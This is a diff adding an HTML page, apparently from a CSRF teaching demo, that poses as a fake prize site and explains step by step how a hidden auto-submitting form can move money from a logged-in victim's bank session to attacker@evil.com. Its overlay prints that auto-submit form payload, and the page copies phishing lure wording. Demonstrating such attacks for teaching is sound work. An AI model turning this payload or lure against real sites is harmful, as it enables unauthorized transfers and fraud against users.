@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>You've Won a Prize! — (CSRF Demo)</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    :root{--bg:#0a0505;--surface:#160a0a;--border:#2d1515;--danger:#ef4444;--warning:#f59e0b;--text:#f1f5f9;--muted:#64748b;--sub:#94a3b8}
+    body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px}
+    /* Fake promo site */
+    .site-header{text-align:center;margin-bottom:40px}
+    .fake-logo{font-size:1.8rem;font-weight:800;color:#f59e0b;margin-bottom:8px}
+    .fake-tagline{color:var(--muted);font-size:.9rem}
+    .promo-card{background:linear-gradient(135deg,#1a0a0a,#120a1a);border:2px solid rgba(245,158,11,.3);border-radius:20px;padding:40px;max-width:540px;width:100%;text-align:center;position:relative;overflow:hidden}
+    .promo-card::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse at top,rgba(245,158,11,.07),transparent 60%)}
+    .trophy{font-size:4rem;margin-bottom:16px;display:block}
+    .promo-title{font-size:1.8rem;font-weight:800;color:#fbbf24;margin-bottom:8px}
+    .promo-sub{color:var(--sub);font-size:.95rem;margin-bottom:28px;line-height:1.6}
+    .prize-box{background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.25);border-radius:12px;padding:16px;margin-bottom:24px}
+    .prize-label{font-size:.75rem;text-transform:uppercase;letter-spacing:1px;color:var(--muted);margin-bottom:4px}
+    .prize-amount{font-size:2.4rem;font-weight:800;color:#fbbf24}
+    .claim-btn{background:linear-gradient(135deg,#f59e0b,#d97706);border:none;color:#000;padding:14px 36px;border-radius:50px;font-size:1rem;font-weight:700;cursor:pointer;transition:.2s;width:100%;margin-bottom:12px}
+    .claim-btn:hover{transform:scale(1.02);box-shadow:0 6px 24px rgba(245,158,11,.5)}
+    .small-print{font-size:.72rem;color:var(--muted)}
+
+    /* Attack explanation overlay */
+    .attack-overlay{position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:100;display:none;align-items:center;justify-content:center;padding:24px}
+    .attack-overlay.show{display:flex}
+    .attack-card{background:#0c1220;border:1px solid rgba(239,68,68,.4);border-radius:16px;padding:28px;max-width:620px;width:100%;max-height:90vh;overflow-y:auto}
+    .attack-card h2{font-size:1.2rem;font-weight:700;color:var(--danger);margin-bottom:16px;display:flex;align-items:center;gap:8px}
+    .step{display:flex;gap:14px;margin-bottom:16px;padding:14px;background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.2);border-radius:10px}
+    .step-num{flex-shrink:0;width:28px;height:28px;background:var(--danger);color:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.85rem;font-weight:700}
+    .step-text h4{font-size:.88rem;font-weight:600;margin-bottom:3px}
+    .step-text p{font-size:.82rem;color:var(--sub);line-height:1.6}
+    .code-block{background:#060a10;border:1px solid #1a2a40;border-radius:8px;padding:12px;font-size:.78rem;font-family:monospace;color:#86efac;margin:10px 0;overflow-x:auto;line-height:1.5}
+    .btn-row{display:flex;gap:12px;margin-top:20px}
+    .btn-close{flex:1;background:var(--danger);border:none;color:#fff;padding:10px;border-radius:8px;font-size:.9rem;font-weight:600;cursor:pointer}
+    .btn-go{flex:1;background:transparent;border:1px solid rgba(239,68,68,.4);color:var(--danger);padding:10px;border-radius:8px;font-size:.9rem;font-weight:600;cursor:pointer;transition:.2s}
+    .btn-go:hover{background:rgba(239,68,68,.1)}
+    /* hidden form */
+    #csrf-form{display:none}
+    /* status banner */
+    #status{position:fixed;bottom:0;left:0;right:0;background:rgba(239,68,68,.95);color:#fff;text-align:center;padding:14px;font-size:.9rem;font-weight:600;transform:translateY(100%);transition:.4s;z-index:200}
+    #status.show{transform:translateY(0)}
+  </style>
+</head>
+<body>
+
+<!-- Fake promo site -->
+<div class="site-header">
+  <div class="fake-logo">🎰 WinnerZone.io</div>
+  <div class="fake-tagline">Daily prizes for lucky visitors!</div>
+</div>
+
+<div class="promo-card">
+  <span class="trophy">🏆</span>
+  <div class="promo-title">Congratulations!</div>
+  <div class="promo-sub">You've been selected as today's lucky winner! Claim your cash prize instantly — no account needed.</div>
+  <div class="prize-box">
+    <div class="prize-label">Your Prize</div>
+    <div class="prize-amount">$500.00</div>
+  </div>
+  <button class="claim-btn" onclick="showAttack()">🎁 Claim My Prize Now</button>
+  <div class="small-print">By clicking above you agree to our terms. Prize will be transferred within 24 hours.</div>
+</div>
+
+<!-- CSRF hidden form (simulated) -->
+<form id="csrf-form" action="index.html" method="POST">
+  <input type="hidden" name="recipient" value="attacker@evil.com" />
+  <input type="hidden" name="amount" value="9999" />
+  <!-- NO csrf_token field -->
+</form>
+
+<!-- Attack explanation overlay -->
+<div class="attack-overlay" id="overlay">
+  <div class="attack-card">
+    <h2>💀 CSRF Attack — Step by Step</h2>
+
+    <div class="step">
+      <div class="step-num">1</div>
+      <div class="step-text">
+        <h4>Victim is logged into TransferGo</h4>
+        <p>The victim has an active session at transfergo.io — their browser holds a session cookie that's automatically sent with every request.</p>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num">2</div>
+      <div class="step-text">
+        <h4>Attacker sends a phishing link to this page</h4>
+        <p>The attacker sends an email or social media link: <em>"You've won $500 — click here!"</em> The victim clicks and lands on this malicious page (winnerzone.io).</p>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num">3</div>
+      <div class="step-text">
+        <h4>Hidden form auto-submits to TransferGo</h4>
+        <p>Behind the scenes, this page contains a hidden form targeting the real TransferGo transfer endpoint:</p>
+        <div class="code-block">&lt;form action="https://transfergo.io/transfer" method="POST" id="f"&gt;
+  &lt;input name="recipient" value="attacker@evil.com" /&gt;
+  &lt;input name="amount" value="9999" /&gt;
+  &lt;!-- No csrf_token! --&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit();&lt;/script&gt;</div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-num">4</div>
+      <div class="step-text">
+        <h4>Browser sends session cookie automatically</h4>
+        <p>The victim's browser sends the request to transfergo.io WITH their session cookie attached. The server sees a valid authenticated request and processes the transfer — $9,999 stolen.</p>
+      </div>
+    </div>
+
+    <div class="btn-row">
+      <button class="btn-close" onclick="closeOverlay()">✕ Close</button>
+      <button class="btn-go" onclick="executeAttack()">💀 Simulate Attack on TransferGo →</button>
+    </div>
+  </div>
+</div>
+
+<div id="status">💀 CSRF Attack Executed — $9,999 transferred to attacker@evil.com</div>
+
+<script>
+  function showAttack() { document.getElementById('overlay').classList.add('show'); }
+  function closeOverlay() { document.getElementById('overlay').classList.remove('show'); }
+
+  function executeAttack() {
+    closeOverlay();
+    // Try to notify parent if opened from index.html
+    if (window.opener) {
+      window.opener.postMessage({ type: 'csrf_attack', recipient: 'attacker@evil.com', amount: 9999 }, '*');
+    }
+    // Show status banner
+    const s = document.getElementById('status');
+    s.classList.add('show');
+    setTimeout(() => {
+      s.classList.remove('show');
+      // redirect back to TransferGo after showing effect
+      setTimeout(() => { if (window.opener) { window.opener.focus(); } }, 500);
+    }, 4000);
+  }
+</script>
+</body>
+</html>
